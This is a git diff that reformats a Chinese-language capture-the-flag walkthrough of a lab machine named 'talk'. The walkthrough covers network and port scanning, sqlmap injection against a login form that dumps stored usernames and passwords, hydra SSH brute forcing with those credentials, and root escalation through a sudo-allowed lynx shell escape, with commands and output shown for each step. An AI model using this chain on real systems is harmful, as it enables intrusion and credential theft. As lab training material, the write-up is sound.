@@ -1,5 +1,7 @@
 # 信息搜集
-## 信息搜集
+主机发现
+
+```
 ┌──(root㉿kali)-[~]
 └─# arp-scan -l
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:f7:03:e6, IPv4: 192.168.21.13
@@ -11,8 +13,11 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 
 4 packets received by filter, 0 packets dropped by kernel
 Ending arp-scan 1.10.0: 256 hosts scanned in 2.114 seconds (121.10 hosts/sec). 4 responded
+```
 
-## 端口扫描
+端口扫描
+
+```
 ┌──(kali㉿kali)-[~]
 └─$ nmap --min-rate 10000 -p- 192.168.21.8
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 23:21 EST
@@ -46,15 +51,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.65 seconds
+```
 
 # 漏洞利用
-## 先看一下80端口有什么
-![示例图片](image/3e62ab1517854cbea07a8c8348e08a01.png)
-## 注册一下
-![示例图片](image/bf7af9edd154435aa35ee40959dc30ac.png)
-## 登录进去看见一个聊天框
-![示例图片](image/c33a95ff5716419f8adfac7588cf583e.png)
-## 目录扫描
+先看一下80端口有什么
+![输入图片说明](https://i-blog.csdnimg.cn/direct/3e62ab1517854cbea07a8c8348e08a01.png)
+注册一下
+![输入图片说明](https://i-blog.csdnimg.cn/direct/bf7af9edd154435aa35ee40959dc30ac.png)
+登录进去看见一个聊天框
+![输入图片说明](https://i-blog.csdnimg.cn/direct/c33a95ff5716419f8adfac7588cf583e.png)
+目录扫描
+
+```
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u http://192.168.21.8 -w /usr/share/wordlists/dirb/big.txt
 ===============================================================
@@ -79,9 +87,12 @@ Progress: 20469 / 20470 (100.00%)
 ===============================================================
 Finished
 ===============================================================
+```
 
-## 抓取一下登录post请求页面，使用sqlmap进行注入
-·$ sqlmap -l 1.txt -p "username" --batch -dbs
+抓取一下登录post请求页面，使用sqlmap进行注入
+
+```
+$ sqlmap -l 1.txt -p "username" --batch -dbs
 [*] chat
 [*] information_schema
 [*] mysql
@@ -117,8 +128,11 @@ $ sqlmap -l 1.txt -p "username" --batch -D chat -T user -C username,password --d
 | david    | adrianthebest   |
 | admin    | admin           |
 +----------+-----------------+
+```
 
-## 把得到的用户密码，爆破ssh
+把得到的用户密码，爆破ssh
+
+```
 $ hydra -L user.txt -P pass.txt ssh://192.168.21.8
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -131,9 +145,12 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-08 00:13:
 [22][ssh] host: 192.168.21.8   login: david   password: davidwhatpass                                                           
 1 of 1 target successfully completed, 3 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-08 00:13:21
+```
 
 # 提权
-## 登录nona用户，具有sudo权限
+登录nona用户，具有sudo权限
+
+```
 nona@talk:~$ sudo -l
 Matching Defaults entries for nona on talk:
     env_reset, mail_badpass,
@@ -141,9 +158,13 @@ Matching Defaults entries for nona on talk:
 
 User nona may run the following commands on talk:
     (ALL : ALL) NOPASSWD: /usr/bin/lynx
+```
 
-## lynx命令是纯文本模式的网页浏览器，不支持图形、音视频等多媒体信息
+lynx命令是纯文本模式的网页浏览器，不支持图形、音视频等多媒体信息
+
+```
 nona@talk:~$ sudo -u root /usr/bin/lynx
 然后按下!
 root@talk:/home/nona# id
 uid=0(root) gid=0(root) groups=0(root)
+```
